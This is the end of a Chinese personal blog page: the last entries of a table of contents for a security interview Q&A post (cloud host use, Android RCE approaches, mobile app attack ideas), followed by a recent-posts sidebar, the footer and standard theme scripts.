class="toc-number">30.0.8.</span> <span class="toc-text">数字钱包的身份认证</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#31-%E4%BA%91%E5%AE%89%E5%85%A8"><span class="toc-number">31.</span> <span class="toc-text">31- 云安全</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A7%E5%88%B6%E4%BA%86%E4%B8%80%E5%8F%B0%E4%BA%91%E4%B8%BB%E6%9C%BA%E4%BD%86%E6%B2%A1%E6%9C%89%E8%BF%9E%E6%8E%A5%E5%86%85%E7%BD%91%E4%B9%9F%E6%B2%A1%E6%9C%89%E4%BA%91%E5%86%85%E7%BD%91%EF%BC%8C%E8%AF%A5%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8"><span class="toc-number">31.0.1.</span> <span class="toc-text">控制了一台云主机但没有连接内网也没有云内网，该如何利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#32-APP%E5%AE%89%E5%85%A8"><span class="toc-number">32.</span> <span class="toc-text">32- APP安全</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%8D%93%E7%B3%BB%E7%BB%9F%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C-RCE%EF%BC%8C%E6%9C%89%E4%BB%80%E4%B9%88%E6%80%9D%E8%B7%AF"><span class="toc-number">32.0.1.</span> <span class="toc-text">安卓系统如何进行 RCE，有什么思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%99%E4%B8%80%E4%B8%AA%E7%A7%BB%E5%8A%A8%E7%AB%AF%E7%9A%84-APP%EF%BC%8C%E5%B7%B2%E7%9F%A5%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%98%AF-cloud-%E7%8E%AF%E5%A2%83%E6%9C%89%E4%BB%80%E4%B9%88%E6%80%9D%E8%B7%AF%E5%88%A9%E7%94%A8"><span class="toc-number">32.0.2.</span> <span class="toc-text">给一个移动端的 APP，已知服务端是 cloud 环境有什么思路利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#33-%E7%BB%93%E6%9D%9F%E8%AF%AD"><span class="toc-number">33.</span> <span class="toc-text">33- 结束语</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/09/26/27-%E6%9C%80%E5%85%A8%E7%9A%84%E7%BD%91%E5%AE%89%E9%9D%A2%E8%AF%95%E9%A2%98%E9%99%84%E5%8F%82%E8%80%83%E7%AD%94%E6%A1%88/" title="全网二次首发！！！最全的网安面试题附参考答案（涵盖护网、红队、逆向、密码学、二进制）-杨CC"><img src="https://pic1.imgdb.cn/item/68a7ff2358cb8da5c8422ed0.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="全网二次首发！！！最全的网安面试题附参考答案（涵盖护网、红队、逆向、密码学、二进制）-杨CC"/></a><div class="content"><a class="title" href="/2025/09/26/27-%E6%9C%80%E5%85%A8%E7%9A%84%E7%BD%91%E5%AE%89%E9%9D%A2%E8%AF%95%E9%A2%98%E9%99%84%E5%8F%82%E8%80%83%E7%AD%94%E6%A1%88/" title="全网二次首发！！！最全的网安面试题附参考答案（涵盖护网、红队、逆向、密码学、二进制）-杨CC">全网二次首发！！！最全的网安面试题附参考答案（涵盖护网、红队、逆向、密码学、二进制）-杨CC</a><time datetime="2025-09-26T03:50:30.000Z" title="Created 2025-09-26 11:50:30">2025-09-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/26/%E5%9B%BD%E5%AD%A62_%E7%BB%86%E8%AF%B4%E5%85%AD%E5%8D%81%E4%BB%99%E5%91%BD%E4%B8%8E%E4%BA%8C%E5%8D%81%E5%9B%9B%E5%B1%B1/" title="细说六十仙命配二十四山-杨CC"><img src="https://pic1.imgdb.cn/item/68a7ff2358cb8da5c8422ed0.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="细说六十仙命配二十四山-杨CC"/></a><div class="content"><a class="title" href="/2025/09/26/%E5%9B%BD%E5%AD%A62_%E7%BB%86%E8%AF%B4%E5%85%AD%E5%8D%81%E4%BB%99%E5%91%BD%E4%B8%8E%E4%BA%8C%E5%8D%81%E5%9B%9B%E5%B1%B1/" title="细说六十仙命配二十四山-杨CC">细说六十仙命配二十四山-杨CC</a><time datetime="2025-09-26T02:50:30.000Z" title="Created 2025-09-26 10:50:30">2025-09-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/21/26-%E6%9C%AC%E5%9C%B0%E5%AE%89%E8%A3%85%E4%BB%A3%E7%90%86%E6%B1%A0/" title="如何部署长期代理池?—Yccol-杨CC"><img src="https://pic1.imgdb.cn/item/68a7ff2358cb8da5c8422ed0.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="如何部署长期代理池?—Yccol-杨CC"/></a><div class="content"><a class="title" href="/2025/09/21/26-%E6%9C%AC%E5%9C%B0%E5%AE%89%E8%A3%85%E4%BB%A3%E7%90%86%E6%B1%A0/" title="如何部署长期代理池?—Yccol-杨CC">如何部署长期代理池?—Yccol-杨CC</a><time datetime="2025-09-20T16:50:30.000Z" title="Created 2025-09-21 00:50:30">2025-09-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/15/25-Windows%E6%95%B0%E6%8D%AE%E6%81%A2%E5%A4%8D%E5%B7%A5%E5%85%B7/" title="数据恢复工具-支持Windows(特殊操作下可以恢复Linux和手机数据)"><img src="https://pic1.imgdb.cn/item/68a7ff2358cb8da5c8422ed0.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="数据恢复工具-支持Windows(特殊操作下可以恢复Linux和手机数据)"/></a><div class="content"><a class="title" href="/2025/09/15/25-Windows%E6%95%B0%E6%8D%AE%E6%81%A2%E5%A4%8D%E5%B7%A5%E5%85%B7/" title="数据恢复工具-支持Windows(特殊操作下可以恢复Linux和手机数据)">数据恢复工具-支持Windows(特殊操作下可以恢复Linux和手机数据)</a><time datetime="2025-09-14T16:50:30.000Z" title="Created 2025-09-15 00:50:30">2025-09-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/15/24-Linux-%E6%8E%A7%E5%88%B6%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E5%B7%A5%E5%85%B7/" title="Linux-控制安卓手机工具"><img src="https://pic1.imgdb.cn/item/68a7ff2358cb8da5c8422ed0.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Linux-控制安卓手机工具"/></a><div class="content"><a class="title" href="/2025/09/15/24-Linux-%E6%8E%A7%E5%88%B6%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E5%B7%A5%E5%85%B7/" title="Linux-控制安卓手机工具">Linux-控制安卓手机工具</a><time datetime="2025-09-14T16:50:30.000Z" title="Created 2025-09-15 00:50:30">2025-09-15</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By 杨CC</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.3</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="false"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="990" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索你想知道的事情" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>